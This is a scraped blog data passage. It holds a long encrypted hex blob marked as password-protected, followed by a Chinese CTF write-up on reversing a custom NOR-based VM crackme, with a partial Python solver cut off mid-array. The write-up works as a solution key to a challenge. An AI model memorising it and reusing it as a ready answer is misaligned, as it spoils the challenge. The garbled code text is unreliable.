5a812bb1109d409fffbf94a93c3367fc5a417562e44e3c70bebd42655178da487ba62739147686bbba061d0a15adbb19ff65313bde94dd38aabce5b6327d24f320d3dcc079c158f3647e7f1823a6c98e5563fbf0d744a32086f6ce8f1c27ce695355698fcaf233b1666bcb73d3271cfcdd95627f52f5b65a244ac1e534d77461a46f3f22b1a5c9e5070a57296db969245caac85162ba65a3a8a06082305cebf9dce98809427a702d16c468555895fdd004b8f39cf96abaa19aade61c7433656bac94409b1f4ac3f29cabdf22fd39d0f9a6e62d987bf79612ebb0fcaa09daa932f66fa60de01513e2b4c43f17440e78c8933bbe336dbfb9730a818f89be758cb69391f5a51bc3406ee5a1700eb6eb972bea8b3a7bc2ec7ea3cfadd2fbf200849fb87cbfd64ff3f621cd966b13d39f234ed39e9a62bac1877a4bb9db1e384a7dd403e11b27a89f679f327cfae55033343eef36e8ce6a2c1502f91c093ac8e0efe90804a8de0899d79e707dc4627eb93334636c3f797a095bb72c3d066a077992ac3835981407736d96e1abb6ff9f3e9ac59fbc2c92f54291ea93111c94885076589c778387dd31518b0123a1dc770c068d5b55067da4fdee59dea4be86eeb4c624859b45225280c6aea5b150d25f61684ca299a30b072be25d883b8986fa15e2a4bf968d9c45cc203a611acd8a579ab8e96e996362ce276756602a6cd6da96df2c31fd0596c71e022b23757d42ab7ce65bb86b8a2831d7b49b9ba70b8777b1e1dbfee340f135b510ac31b9bdfa4002e0edc3bd01151a0612a2bb662afe38b755362f40052f16949662961f05f772d2ed42e4f4efac1f49bde9f1c5d435aea7b406afb051d8160ae2b47c8f8318462ad5fc555ea4e97663d65d078c58971093f938f1ee13d9a77757de7a5344d5bfee0e289b3cc17bc3cc7dd229b3407b4fcc0a593c08e3623d4666d865e8b62b96b263ae2239237320f84fa2c88d961d345850220ed3dfec5b22f5a910478167dfc4db8cb025f1f848871689d87e26840f6e515e5aeb0f505e44c4fdb5ab57d0426315f6561673d9e74042e29a01a5e895fadf067cacfadffa4c5fd74227f837770ada318c3db2235ec6143af85b3dd392aca0d8b71c4302452e966669c31685e6cfb57d304b4e68c3f161eadf452f7da0a9cf30b06b95c0c86cc50505c8701f7354dacd5d44a768ac646e4bb32e221cf2a5fed0c83cd5f3d213e9a891bec6874920a6518bc7dcad4784b1a9d99c604bdbe5a5773238cc2ea1f81db9635f7c433deff4196200f439ec3d3d4779026253275c7b9bded9141022bd9398d8dedf5b4ebf97f93efc752e42e38a00ec830dd886b1f00ce8972945e3afa643e361ad3d3252fcb4c69234085d11c5e807dda308db5adb8e9916104039f8aa560f27822449a74275c8399bebc9b43b699239ef8221fd51529e5c812bffaa13dee0972eb2655191d2ba11540082ef1b72e7a39dd26a1d6ad11a2fb5bb754a27c43074ec72c5b39479d1708f98633dfd3ec5beac33f759fca2a4ac780e3538026dad0d6d09216f8c925ca28d5e0c287289dce9e9040cb2439878b91954ea42a86458585992a1925f283ef3c0703dbe96af96f21da09ddc335820e6e6bd8ef354d90332410f9611dc53988ea135d53f4306fdf9f3b970fe5d1c8f8c20e75d4ce273a20d5befc3b47bb6b6c6dca62bf6d6986b9ad0344d57f588c84c3284b4c2c4e149e994a22eebaa0d7d17e16eb62e00615b8629fb7e33be4ff988189f9baff3a9c00cef6dfedaed0c964d6030bd734567059e76110598e86efe0625ef59f0ca9c120a4f8d5db308fced4f4892eb7a93771e38fc6815651dbb53dbed3b5c98ccd1cd1cf8d74fb503bc50514b027e560d36c30fb3653fdc815aa891b9b833e317edd21f0e908fb7aae957a88e967240d4b04e7974ed0ea122021f4483189ce61f32d6dbcf94e5950ae09cc8476f3a3e1b549bb999362cf5cbbe526153991f321e2769657acab5d5891ac4199cfbfe9bdb7d1eae4d006de089849da7269c4b4240d29304e619ddc6be5ef668ccda702f7dbb5e1a5b106e3dc7dc5d0b755c29c557551759154168b4c41ce1313e9d8fb5e8ab16768964dfa0e6537df1afa6bb70ce7b438bf070984c49684c524ab5bc22f7d4a5dc86ffc4ad1a967974ee9bd2eb3d1f3e71568fae3475f83ac433e2951e805a922b5c4782bb5ee5bce02112be446e93ee84840cea2d094622be287bc3b1cc880cd98557baddf15ad561fc6464226bd7d062fd17059d84e5a44a468a1237e845f4fc2c1277ae554ae909b145b0b3a441bc7b61e93ea6749d99d2750a859798d372419d9e3a5b8dde8df1e491665bb0ce0f119ce4bd96592d514d87ad36f03fd243887648b8632b8e554de9ab635ccfca577a9e25033c46154e2768be829916d3b5b340f20261cb0e08e4bd83e7b5ecfd9f4927407e4426a1a116bf925c1e6dfce70f162b293dfef7e2ebac6a73639af1bfbaffd21f8d73b8a9696c1b356f654db8f62010b503ab8a2a43647b62869d4374fda33f630db1aff984f6e0698435b9e640bd028d4552b492777331f91f5c2def32a550c72e168ac776e185a9a32d81c8bb995ed58ca06268ecce12b54ae6c25e2ac80411c8781dc34b0007f49b2fa8ace1e55512feb515c6f363c9a4cb3212e946a4f5d2bc86eadc65a6cfde737f8a9c5e7b052c6f2eabe01ee127cb1ceb5a4e5b0b26201b261822e3fc5a71c27a23887e97466b847b3677f4acf17decf6b7812754917f030e8ca8bf350170887008e02c9552e742e620c6cb12abb94d94e1562d0bb5a58746f16bf817dfbb14d38119144dc105da45310ce9e95e02725dfc2e96005789709b493714ab122f90d65bf06603a45aa7f19c175414b7683a7fb9893dfcd09d988824e9fbf317d11a86b01de5e315711a45055032554051fa4179a653443a0b9793c0139461cb08690dc0a576fa343c7f2fd1d7de734ed3cb2da29f0dda0f2c1034c540d48e7fd1622e09d76e0d0d5e4bd9f89a0ff855b79804af2e7e852116fbb087263fce486001ad1758862ed06d500cfbbd18433757aefac8e9048015442e4e46973e47c230288e10196840b7b968869b3d84b67a752cc94a419df725516adce650854e44647dea42108b3539b798dd612f907ae5d46c962fb42c36b95b27b9b8786aae3b5cd4d3f3a7a3aed1202ea6e7ac411b38d5d87b3910a95ff577e13679404bbe4c42cc8abeda7cd1b278440c82b915e9a2c0cb83ba6bdd8d94af2f56697f3472cd924660caa610dfeac3ecc6fe44e5d4f5a8f2238be27323f2b5a05bd05bba9d5bab20ecf2df729b9168c1783cfb0772c28ec23b869adcf278318050bd0a4e750c3684e371584ffb7312890651e5f8a1a6d2629b0ff6d0e30b645e2fe19be8dbd4f1b3d692ba6e2ee6af1b51693bcc50fca8d0d39054c00f149f0710998f26acbd272fa4204bb0502e8452a7dcb42f3b13adfd3711044592b396867a4be4b557a418e3cf5943b608a97cc4fdd31523d24c2d44aed1673f88a99ba545e718cd21420ed1e277c4b462a96b6510bcfa3ba267f559ad4f92f33976763efc968a37c5c677f91f1d8071aa1aaea365c2778f72496cb95f00bee8838708bc98a8b7476829a5a0d533e7aa059e0b3e19052e2f3ae35c144e0249875d610dfb29b1c6b87cb48fe65716aa5abc3f636a1e6b62ec119c2d0ca51f5af1aa12c35199a54a99739ca9d5c5728e005420fd6ee82ede3050f84f1d60a3e0592b04c1cebe7bd20f6951419983cdb8884bb7a66497fabb90836003a6d99a3a173bdb4004878a2f3762c116b2f981b408305078095b074b04fe1692ac00a3dc254ef92e0c8111911344acf52c25ddd5e24a556d58585770f01c18ba290ab0823d923c71f41672f0f62fff195a78bcd626da16ea7fb05dfeb7157986c0b5890fe125e95099c07012ed5d3d9cdf483afb6b8ba447e30bbf826cd61af9c8b0efe6cbe4b74966f5371130dcc6f60e6ee6187649b26eec394634eefef5680f6bf38fc6c7acd48ac917df3d2711b898bb397c71630c14aac68cb57cf94569607e85908f9c51e125a038826583af6fb3db655969e5789e824e3408b16016fe1f9aaeb934f11f28884c55503f9d89a3a1a08d8efcac75f6e8fb91d26c6982f10060a1aaa97433740f0c172c8eb32e0109f8e9c90e1399ee4f47f6841749db15fba7056eeef47825fddff22e7c79b501f1deed56ee119fd96fc5bddb5b8802d9548c702fb9a538f53132631bcbb6335175f6bdad9d37b369584b5d8c3fa83183c91d46869ade2f6d11bb74a36b697d7b2442a3cf3f509d5f075eb12528b8d2155aaeec9488a5055559cfa69f460e2c92656365cb71ee91169215e62f11942d5da36c5c832c01344ed39a207ef0688d7a017b57dd9dafc717016691fc109274da173cd76cad54e616b87175283e34b30b4caa8035f450a0a623db857c49e221bfec94b885baa9588c8751aa7746f3ce8c8d993cefc31416f4b796395c3eb3e741e48a9aef7b42a65725ce3de6edce2b6892990dc06f6200ace4e70071405244e86eaea022333a5d87aec231cdf99b4f67e694a705b1b277a36d137f3b1585083831145ce0bcf2c78c7c4ddee629c2a72c9c47563a7b256236465382586dc41830fabc5e6d0b1c8e7525179482c4b2faedce7228acf2e176f83c37fd1e2f2f7f055e46df60ee7c1f3932362383d9c6bac56ac623b3357daef6140e625d1c2509befb649fba9121cc48fa5a4f9e3047ee9b95186353bdc4fe14c258384283f7cb0686986e656a2fed0287af781ec06470c9f9ea119213ae6bdd7f2aa3edcf63c15ebd7ab295217b33d2110cce5b3391a6e04d43ae20ae592f191540d469a956558a32ee147b97dbe546ee3cf9a8b4575f3a6234bfb2bccb91ec1b50a1303c1adc2d4b1c2176759286d2f024718cb0e392b34c67f6e42f9719e447a7cac8bcddb29bc0eadd01073ad3e98f8ca584390ef4d450f39821db3e1b4b3e956dc116a8b2147ffb94f3bae1d78f1d4202ecc6937be8b48f218845a4778a7bcdae354eadcaed0436dce208bc5d2b96c1412936035e10c3935343b771f4d0803ddb9375519b986c128bea9df783f442589c875543f4e3bea574efc205e73e01eb1753c0fd525b42eadc9ccbf53ee8a0e3a50d05c015b6fca66cc2ff0af2e1d96f0be67e9ee8bc8eb5203ee82e9ec33fcddfe270b8d316bbed54bd21a576def03cc9989567a4120c036c6b605b7cad3584c95ff3ba667f7e18440e84b53ac8afeef8d988678626c7435b44a6debaa529b6de1310955f9da8eb822c241a6c507960787207ad1b2bf46fef143a88b7563eed6f3cdb52617fe4eb2fa7018561ecf1ae2d22bf6dfee8087af1bcd0e701301259a0410de322a48790917e21935760c40dcd09f5fcc28d4af980bdf412c79594f648beb95a03af95a01de33dc0bb94f1a24161275051ac128066c87b0bf62886c124e561165d90950d4cad859e708b25c595270b0dcacab388652654486dd1dd9bfbd210a0e9ab84a6b6181661ebdb81283c96764d916cd753bb6640614c018b6220d07f45be87392780e49dce851cd7c1f5ee1b7a62ed29230df5af3e29f1be3ecf14a7d3796df630f7b928e1ce651020d178593e049dfaf4f15665e9cb59d022519facf65f6b6ec4be85896afe92abe56860f4f60cd07349f8908dfb5b85cf77fe33f605e3e63b8b59f2cd79207d1e4db1dedf4340102fa60505bf998a9b5287ad35bcd63f25cea27b5dd297e42bd52167f2b8b9d58159d809db9d04535c5efc68ab186c65cb3b417bc644b2f564b907920ae71b2273edb5bced996006e50de72409491b40fb4bd9e74d72da47dc15b5bea54b4b81114a9d6f0ca77b8b9c1545682992b594b01753ac7011d71616ac0c1375e0d2425a0d723f4b2aa0aa061e6a8b598736a59459a1a8184f8032b6cff9b2aa94a71b660f3bae195cd8122effcfb83de863f78bcbeaf2f5447836571ba2d825bffaca370b228ce5c29fa55121ff3b2647ffa2299924af124a08acb2583f05360dfcac3742e09e0c4bfb84de6e78c31f10daae1931941a1b4897b686a5889636d010b3e8d864fb5a30b74e4857d8ad3ab10fc5b136bfb94e7547a53866c9fce5ede4af557bb0357a0aca35af1d0fcb9b4f790bac9eba7e1ac328fd5842ca0cc0a52eae2198905edb5d480eac1a34d306f68d0a69bd8ec19b9d49d82fa6ca369bee36504298c269162dec678b502e108722bb4de333e88c7ce31982b79e7f493f790846b0021ec42348dcf9e2817edfe3150ab4df20a1c4f1ef4f36b01f687668bba39e7c30765653aa0db71d5fbcbaa3766e1cd4a60afc528ebde8559d3adac00a668572fae9ecaee2a8d06beb0c3f5b9c5c4bed7b3d84c7e23c834ac43cf04be2b293f7b5bd3403ae8bf8a3f84796a354f43e19cbd942ab4975511f800f7e5acbe3446de9ca73c71e1052b300d498c5d0e5eb22b9fca2559429113151640007967661edba73673fe50a1cac7cb2d429c18d0610b8377b0558f33a40a4ff51120de93390dbcc8324d1ccab90989139dc48133189e563a791cd0113885baa0e13a9f0b90b06c920bf8f423c27f42260f8f2240bfb770bd90fe7f2cb3df50e3b8652b1f7c8b99d9cbc19d1d0385901e269012f0b249597a4bab9f02bcb59b55e79f7ed2a0fdb3c0faa6963ac02523cd592efab92e554b5b202b1912219973e941b87166f20f6d2dab70a2aeb83a67645d51da0e40034887622c25aebe0bd16e44a896959db3670a98f6a140bd57bf7affeed362fdc369812abf9058eb42f2d05bf2a82fe56fa4c836d4b4d6279254378df55678f69834098c32eed284023e95ba0fd3e519da473932c2eeb0f7f246afed89c84f4b997d421fe5413dff713407debaf19055c149cf0ca5fa6ad084fa316f7f226c661e0f8c0066119c6a91bea04a2713e75a028765d2c25317ff10295c389dec7d0eae1ba8d4f3af8854e93e4e32de238b4f65ecdceedc1b8318715cbdaf2ac04b22f09b711b57f9dd03d8fe38fd8347a89bd0dd2829ec970d3b2e99b8b7d2f84b2988e828f092ded2dc007f8b9f25ede3334d5cd9adfa32abce07e96f1a11136e3e02e5f2d4e23cf1b4da3d14bca7f1f9be378d961a07fc9d9369d59eeba3131c5ec3b77d878a19dcffeb1b46353b6e142a967c54b2f05eafb3c7139ed765bb02e958c2a4223f358c2346f9e63de94c895a9dde8f5bcbb18db0973571522c6ca159684a45ce092f092822583dbac28be452a9870febe893dc206b1834a3032137f1257742c531d963892acbd0360f50f036d77e3fa6503cee8739efa9e234a9d8f6bf75b63f9985cf0fac5cad2b7f0956a46c10059f5e346a7108356f1dd7e8bca64e77090ad1819c59bacf8032748d7bf7bd5b662e7176c50958f5fb21de155e0e2c96cc43eb059530b905fb17f55ef1e2c7c77a3b69f63c1cc3da9d7309d93bc9ed28fafffd3b3604b8608ce9070037cba5a3fc81dc717d1460e1de929b19a0354238cce2df8e8549fe81cda550edf0633ddd35122ce2385b64ff9b2d1ccb8b000f3496e9636a2ec95407ce75b887047ec915eb9bd0faed3346a3c2adaed2cc8cb890beebb2b8b7b4cd50e6b309611585fcbb08dbf54f173c017cbc378f138bca1f98d57e97858635e745fbd1fc855a1c429e82cc750674703c2981666f91c0f0dbad2fc80111094d1d69f9210042172413c8b17b2c6d6337e75f329c7147a56e5f34c7d5ef09fcfb5457702d0f1f84bdca6e64f29daeccc758a998f54edeac17011c43b1531f0234c8a256bc7858b77c7299fa441a348501db9a6b791bc97edd6ba4c88af1b248221d1cf3f2db2938b329b30ab49bb826c70df850c244ab4ec1978e8b32f4c358e4c03507c31af8ffcf26be9b21ebe22a9cceeab88589c356b32a05412ccdb7f17ec9704e0f6dd55da1d67d0a8098e471d3c3b24815c28370bbbc19924c45e7c6143edf9a63d63899beb40a0ba36b1aed59314a8f2d2727eef9b86f07f1fcd75a6c7a105e9011e75a349d65176a5dfaa297b36e23125a0c2b471df75949d03e0360b69e472d1e042b99d3f8ebca63bc4f0ef914862e440da20ad51a7ac9dc0bc495746e2097e668798f507868b8cae7a808634e7a081104cc2e8627d0fa48ecfafb2dd226b25e23d8978f489e0fb0bd4bdf5bb6e7d8ca151409d61d022092efa7c11993fc3df8bd395732c12aeea85b26799b41a4ef00db42b8476230fc43e3c6604d4a9dc09747435d05423a98ffa5232a0e763f4ddbff18054bd22cc4d1cd6685173931bbca78e980bb64cca066b587976dc27f3fe39524f34d50ffc4acf5f44379646c1e38edd58bbb5974ff7f280f5c3400cdebecca7be48e784430ae0cae64d77fa73f84f6b5cbd1be4a8325e61c5d021c0b6d39760c9868230d94b062d3cff9cd98d13672500afc51862b1f8cd62bba65fb55090adb90fe41b60847e565da03bee557530715c58213e9ca459658f51c9f470272f17fb1c9d9c469c281d1faf724433b27ae692bf1687d98a4d6e2169266e21df61ec38d3691e7c87379024e8ac03636ed3376e86dab3ff459bc68d2d8043d22a0339e0f287a85dcd1d1277140e413fe6ebe1b63e23610da71515d6c729fc73796e45c8ddbc456c158c49379e1584395bba6334244f2ae7a85947b7e86dfd4f441cda8ea169dd35676c9f5bc1e682ea9372e621baf956701d4527ebd670fa96cf20f1bcd8630004c6738187c539e6f10669e1760c25e5ef5094b4b554466460746f2f109e22a6ab7a9d89ee0739fd0c9dce9bf3e96fbe1fbe62d6a4d1d40d9e95c684aa4bbfc198aaee051a796e4d1495c0f93df99129f6e341d4526dbea7823ea4641ba1b9e4719c456f2f5b11aaf3575b2ffc3580509a87649b905f8233991db7d336120d301a55057ac19df5ce805ab6700915e0b853f62661111cb2a8096379693553fd208121b0c6f9012c8795d0d55cbb5359ef83ba68a22dc276bc622a4d6b5139a29dcbe000d15e936c5d8f7984ee073de2fe1e455e97fc1878b54393b578c8f5da3eca6182f9bf4feeb8c1476b494f82f065df348d5ded1cb9b437358aff5a25fed8e86ff13065c05c7c64e625bfa4571db4d0fdd3e049194ced42dda2c4d9d969db2ca4cffc56ed4b066a8306cb231507f9e06ecbc18ee6c1df32240f0f006bdcf46ca285e3cde42ad77122c584ac1e3e129f434038aab0fa3484fa82c0ec5c3c2b83cb9759907df36342243c4aca4fc169d919d378585ec9b5a81a430a09dd5bd985f134adfeeeada1d9ae1726037f4ffb5b4807711e18f3287eb448c0d9a2db1774f3c7f0b12687a4874ae209fd09b4dbc3ce3b38359a1f1445cea98ae402f3aee5e21dbbbfbbfefe75e4f8c2024c7702c2cf1eaa6a9bd5f1e8079cf3deafaa6c37c72a0b7c428a265b24932c3593685a0e008fa24e69934503615708d41a6c276360ac305436eac5f20b5c8c46e36dc0630ba6fec78c07a194650266ec33aff5662675e493edd0fc4f2b10b4c950be97e058b31a64ea24b6deb7a79f047741fd4eac1c6923a38209987b408b376932cd70d5713a5055f27ff900288e633385f73cb966377aa5657385ec744e167ad42c15ab4952dd233cadc2b0fab61a79740869f62f9396c1173a25be0f00496a7d6a58a675b875fd86b9784e91ed532d186813a9b7235af88884f32ffc20c1f0d173b7f81675297af4b7204e9032a02d06fcd1e7f90f648e7caf006f3ecaa82cbdbc578edb02a8d91af18b63f7460bf9aeee08feb43d539ae11dff5331494659d4d75a1b1912e339142124e76ee6f816b568ecb7b6451a1557623ee57ac412bd59e4253a2dc74dff967c80d0257bf9e7eb2bbd2bcebf4251f6df839a448155981c5d00ec52d0033aae932929e8de5b19007846c8be6db306be71e76cf537db28447fd4322477cd80200bd52f23608cbf618d8fca4586389e8c569381b303e6c38605fd07e147e558e8862222c115c4005dabe86978606f03fd0f4c19116fe9cd04b73f32c1bbb7553c4f8fd17264cfd184b04b7b1b2073812d7ed357f4e63043ca34d2a4af9fa6eb3cbff50670f9ad1bf986f2441275971262627623a289bc12052206e0f149c404c1b0d544e106e6b1648fec88b2d2b4906e801daed7609ac239855696fffcd0cc0e267ea2c02c25f0bb1ed284f62a2d7e321255cfd1bb2ee6e3140e77d4651dd68b122b6654662b6ec13fd868447f928648c40df0baa48a62cc853a452234f33bca079d591a4a7d56373cefa20f3a69ca9aac9c81488979e0a1eef9aea39b05d48147c6b2c15f355a47977cfd68b30038b49c51a77acbeb18740a02b5121aaae3ccb9992c9577c0cef1d0aa208ab5cd66e54914680611906fe43ed375f870607eb8564ef2edb579a0ef043df525e5e434202bf8052a6124302e18daf8851a20573565b7ede0eec79eeda70c223f082721336b80567d4b93727df53aad9b6e8efd2d55545bfa80663048ce48349ddaa2521928483e4544cf6efaf0373a348d005999c30ffefa9d9df5e76130051babfd4736638a3fdbfe456e4663afefa3e551f5dd749886e8fdf567bec86bb80281f8e7dd923bc0091c2ef84fb0b63c6d871745391ad44cfe6d4885b603e8051a2ea3bfde64757b5d71284b701377c1513b5fe2e0f0d4badacdf191bf95bc01b04fe5d7c2ad894b283a5917eca882f57f69441cd5ae5b8960ece3289817d59f79322972ad8dd60a0123b1f1385a21fd15d36c10d29dc5db4f9772b24e5c91f5b5276c62b3a5dfa5bd2d4192518204c241258cc30b6c3a3faed90d4d710577980b03ab1ca077aaca5578b97b1508a652bd46d13a87cae7c26a0631d0e862614daabdaf276ae0f69525330bcc9c00fd82c068e7217acbf395545378377225bb38ac123c633903e52499f4bfd26a15aad402f3ea1f35473b1fb5eb1fca678c4eda5c059885c79ef51c35e982c8d0fca57d02ad715eeda3b3b29c974b714ad00451ae8f00985e29475decd9c1788edf372fddf61a5c1a8b03200cec6866f0e9025cc9ddd6b6f89f4c572c33787d525516e489690e38ccfec0a12aeac2143d9d5d469542101cec57574ddc97b4261dc82fab1382b28325bb3425c95893adfdb9358ad9b0e650b6b68ccc4a0ce89ac3ac9fbd050270f7e53ca59a4c212a20a8d9bafd9e3be1fa1f8efafdde826c40aeee3f5aec27a3a140dfc81755a0d1337c96285a47548c2bd8a928fa3d623bfda525c041722957972a7e047f3cd0bed3c06ac8d33a6772b94daa0193fb3c78cea792154b2bc4530c276fdaf132a82b243ae93368000cb76e1f9dd576c3f7293dc399563703813a19dccd19d755f034a00b9597fd35224c3f8f041aae955e1d2e3a9876fa90b1a5296580beb73d2fcdeb2e683baf9a3518941048b375228f0c059910910d734c5e1aa33feae4c0d1e3c093df211ae704f6e397e607a7674b17e1dc944c1efc56f24d5b1e4a6a510f5da39a7c87d061c06efecbb7435518006266e0467b4221a71d422930d96e8749e07e76fb05c815966b6829614d895e944bfc4cef59bddb446c0c74e2f326e12f95299c8ca5b99a49749d786483674fc2a2b64010d00bde669003fe4cc28271fd29945b9060fe9f4dd70eb3abf324578eead7562bf8b19588333de59c8ec276b29d9e7b128b847229c6d8b4971cdfc6d07b58a03739750602bc825b31ac6d892a01e16319ffcebf6374d288f0ea6d06164aa1dd3ab3afb9f3f7bf49547ba06399bea29240e20bea4eb1c857c35352dbdadab0402fa808da5cd71bc3092c658e376c804ad3fa13efb2e348b05e9d7967f38201d5d000a12f14f117ab83e4d0a2ccc4e43d27e664abc052787c09bbdfa99c5bbc0081d306304c3f040a497ef7595e7687856685ce720b9da64cb7f6f95d9f46d71d4a9c3692cb7148f1606debf52e8cb0b5dffc9f35f0fbdfc069ddb559b6686df025ece2b0ca55afacffb757ccef5c775ea354ffa1a4cfaa2db9307decaebfe5c5fab450c1d6d51e687bdc3bfc0b5c658f16aa591d4a991e4f6ccada01163267538ec4ed0d023223fe99874f36b63d940385806facaea925012e247effd26407ff7e400dcbeb8deac6be4e7daad0719b19e2176c041e654024dff1999fec3de56cb49788576764c51d1375b1271e3c45c205382dc8c9c1eafe13a1b2ed94316aff2509d09fc437129758547205c0a6f5c19fcadba2d5a3aa391b0e3f6631d3f0e2f55e7e75810f5ea3b7619780ffeb483ac9553b63b9be7294842999665713a1c717134f787b647097e8b23e1007288f1d9f4a54fdc3fc1cfcb9a00f7fdb4b6c080cc882a1b507f25b5bf737f3498355c071699312c3bdaea2c40203bfa06ce8ac610b4c599265e55bb46958de8552337314d857aa2aacb770552523d8685652f404560ed976677c1d8de57fd371f50b2871c8504489cd20951f959ed39553f9195788391fe9bd18487aa24af8fccd3e8627c0bdee2851dadbda3dabb285c85cc4fdcf575d44fb2e2aecfc038ad8b93a9f636703680bd0e16e99aac97a93b2b8e23c99eb8bf4b88c11a773bb370f0e1c6d74fe689e03c277f9fb04421971f5376ee3daf588e2e051b2a576568c6dba61902b4b0920e7a479890ad54eece82e549d70fb2e3cffc4a208db1c014785f05d949e053fe1572efcf6e33f7c1de0918be8be56cec07424f15f44246833e63b40fbfa6292335eee4a1c8f442a857a2a465613e932814ab93429dbb27cd693ec04b0ea47d7ac8eed19ae07d81140222aca40200a76a1c009a407e478faefdfaf3d3b9a9b6cba76d6974f7659fd19b66918088960a77f3b9e58e6edefadcf5f6cf09bf8fd60f36d81b6de4c696ca9d78a92407af813d23d7b2b9a735fb94f124a879dc13035ab09c52959edb3b9d9f68d17670087d214c96e82a20b7f88fa0d2d0513015bbd7401eb4b7fecb04fa773f880dee6a167cbb2c236c2a0fae9f365c948a5073a65faa69c7a309b69c5625536a6b2624876acfa25ed5869a36a42b7541f45ae44647736b1fc2ed137aa13f070bd4167ce4a29e2090f68e811341949cc43947fef116f3be18b5206dbdafb3417166d96bb13dc0ad05d7d135fed8aedfdc4732688bce095b15580207c6ddaeed35eecfc0f9d7e3e30370dc028f489f277cae98c101d49da17d1b21b04615ec44b818115d8badefa8c8a8c84110653fbaa36af2a7319b2e1b40f1fd09e2a77cd6cab8483c60b5da65782f91c77654d7db8152cb7732801ddab1d66c320ccf6d2d28074a5428da5bf41555cc55e02c9574e1fe890d2d9c380cfdea9f32de2b43dda9a8693c279ac005e82001b5cd4ca2db95748d441bb1fb191b2539bc1c75aa10076ff52b2a996b8b7d8828dfd1e90de103f496c2c7bc8999dd7e230d60fcec4e89e0446bef7ec4a1d06350dc52b8aa031b374f5515b02d7a12b2abbd7623e3eab93bea7d2b7b71687ee9ed0be94fcaedf37231914a567e14ddb46e9fafd6fb894d54ff90aa1dc31ddc2366bd2c86ed0a73d42e39f794e1f24464a679445b23c2edbdcda096fe6388c9b268a49fef4215a31d7684ae9e9efd80522704d3b848ee004f35103cd4c012e10a23620889969119f9ce31f5f15bb43ccab9bcf0fc9e0c264589500ee5ad4f6889bd18c33b26ba44ce361b558b4db725f0e86cc1398dbd3ac109048edad03be7d2be7397af9142cd680a100fb0c0bd9a61e2e228e50d61f02c057ad1f112c5cc62ec74cb9c30e7dc1be55c5b034f2b5dcecbb794234cb692417f0da28dfc2f98ce2c22af4397c60200f25364630bea1008be914c099fdfce2e704006d796dd509925098fd283ec5bd957fa1a53660a7d0b50b0d9373d1281a9745b7c4855fc253fb7c99edcb5c2e0d7e2d8dd155e57bda255327a2275b5d1f65039d389177a33be73332ab9137cb608da7ba03e53f1ade5cd17818ec6dcf76af238503987b4c9433aacd90a32fd7f3ae626392a38c1683c5daeacff51ef72fc91d57a860866387057d9805dc4dfde080716034edb32bb3b03677d37752d1c1fd6243 您好, 这里需要密码.","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"Weird_vm","slug":"Weird-vm","date":"2022-10-16T16:00:00.000Z","updated":"2022-10-17T10:18:49.417Z","comments":true,"path":"2022/10/17/Weird-vm/","link":"","permalink":"http://example.com/2022/10/17/Weird-vm/","excerpt":"","text":"main函数： 一个很巧妙的VM，运用v4存储对应的字节码，不同于传统的VM题，只使用几种运算来模拟VM字节码的分析，本题主要是对于unk_140024A40数据的分析. 前面一段字节码的运算是打印和输入，后面是对于我们输入的存储，一位一位的输入存储，然后一位一位的进行加密，每一位加密方式不一定相同 配合动调都可发现输入是存在 v4基地址+0x3F8E 分析加密：第一种加密 加密开始调取我们的输入，重复左移15次，后面进行了一次运算将结果存储在0x306处 第二种加密&#x2F;CMP这里运用NOR运算 最后的操作可以看作是比较函数CMP，0x27就是我们输入加密后的数据， 多观察几位可以发现每一位加密后面都有一个类似的此字节码段 但是这后面也作为一种加密函数来加密输入 参考： 普拉格普布 2012年3月 |NOR 机器|务实的书架 (archive.org) 第三种加密 左移一位 解题由于每一位的加密方式不固定，只能依靠代码手撸每一位 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647def ROL(i,index): tmp = bin(i)[2:].rjust(16, &quot;0&quot;) for _ in range(index): tmp = tmp[1:] + tmp[0] return int(tmp, 2) &amp;0xffffdata = [0x1faa ,0x1fa9 ,0x1fa2 ,0x1f9b,0x1fac ,0x1fa0 ,0x1fb5,0x1fa5 ,0x1fc1 ,0x1fbf ,0x1fbc ,0x1fab,0x1fba]encode_type=[1+2]b=[0x1FF2, 0x1FF2, 0x0007, 0x0007, 0x0007, 0x0003, 0x0138, 0x0138, 0x0007, 0x0007, 0x0007, 0x0000, 0x013A, 0x0001, 0x0139, 0x0139, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FEF, 0x1FEF, 0x0007, 0x0007, 0x0007, 0x0003, 0x014C, 0x014C, 0x0007, 0x0007, 0x0007, 0x0000, 0x014E, 0x0001, 0x014D, 0x014D, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF0, 0x1FF0, 0x0007, 0x0007, 0x0007, 0x0003, 0x0160, 0x0160, 0x0007, 0x0007, 0x0007, 0x0000, 0x0162, 0x0001, 0x0161, 0x0161, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF1, 0x1FF1, 0x0007, 0x0007, 0x0007, 0x0003, 0x0174, 0x0174, 0x0007, 0x0007, 0x0007, 0x0000, 0x0176, 0x0001, 0x0175, 0x0175, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF3, 0x1FF3, 0x0007, 0x0007, 0x0007, 0x0003, 0x0188, 0x0188, 0x0007, 0x0007, 0x0007, 0x0000, 0x018A, 0x0001, 0x0189, 0x0189, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF0, 0x1FF0, 0x0007, 0x0007, 0x0007, 0x0003, 0x019C, 0x019C, 0x0007, 0x0007, 0x0007, 0x0000, 0x019E, 0x0001, 0x019D, 0x019D, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF9, 0x1FF9, 0x0007, 0x0007, 0x0007, 0x0003, 0x01B0, 0x01B0, 0x0007, 0x0007, 0x0007, 0x0000, 0x01B2, 0x0001, 0x01B1, 0x01B1, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FFE, 0x1FFE, 0x0007, 0x0007, 0x0007, 0x0003, 0x01C4, 0x01C4, 0x0007, 0x0007, 0x0007, 0x0000, 0x01C6, 0x0001, 0x01C5, 0x01C5, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FFC, 0x1FFC, 0x0007, 0x0007, 0x0007, 0x0003, 0x01D8, 0x01D8, 0x0007, 0x0007, 0x0007, 0x0000, 0x01DA, 0x0001, 0x01D9, 0x01D9, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FFF, 0x1FFF, 0x0007, 0x0007, 0x0007, 0x0003, 0x01EC, 0x01EC, 0x0007, 0x0007, 0x0007, 0x0000, 0x01EE, 